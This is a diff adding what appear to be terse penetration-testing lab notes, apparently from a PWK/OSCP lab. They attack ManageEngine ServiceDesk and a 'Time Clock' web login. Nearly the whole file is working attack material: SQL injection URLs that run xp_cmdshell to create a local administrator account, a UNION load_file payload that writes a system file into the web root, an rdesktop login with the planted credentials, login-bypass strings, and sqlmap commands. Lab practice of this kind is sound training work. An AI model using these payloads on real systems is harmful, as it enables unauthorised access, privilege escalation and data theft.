@@ -1,0 +1,47 @@
+##### Manage Engine ##########3
+
+http://192.168.17.245:8080/WorkOrder.do?woMode=viewWO&woID=1); EXEC xp_cmdshell 'net user pwk H@ck1ng2014 /add';--
+http://192.168.17.245:8080/WorkOrder.do?woMode=viewWO&woID=1); EXEC xp_cmdshell 'net localgroupadministrators pwk /add';--
+
+
+http://192.168.17.245:8080/WorkOrder.do?woMode=viewWO&woID=1); SELECT @@version
+
+
+
+http://192.168.17.245:8080/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=6)
+union select 1,2,3,4,5,6,7,8,load_file("c:\\boot.ini"),10,11,12,13,14,15,16,17,18,19,1 into dumpfile
+
+'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetSer
+viceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini'/*
+
+
+then browse, http://192.168.17.245:8080/images/boot.ini
+
+
+rdesktop -u pwk -p H@ck1ng2014 192.168.17.245
+
+
+
+###### Time Clock ########
+
+SQL injection authentication bypass:
+
+admin' OR 1=1 #
+
+# Add limit clause
+
+admin' OR 1=1 limit 1#
+admin' OR 1=1 select @@version #
+
+username=any&password=any&submit=Log+In
+
+sudo sqlmap -u http://192.168.17.252:8000/login.php --data="username=username&password=1Ql9zrIZ3JuphHV&submit=Log+In" --dbms=mysql --level=5
+
+sudo sqlmap -u http://192.168.17.252:8000/login.php --data="username=admin&password=password&submit=Log+In" --dbms=mysql
+
+
+sudo sqlmap -u http://192.168.17.252:8000/login.php --data="username=admin' OR 1=1 #"
+
+
+-u "http://192.168.17.252:8000/login.php" --method "POST" --data "username=admin&password=1Ql9zrIZ3JuphHV&submit=Log+In"
+
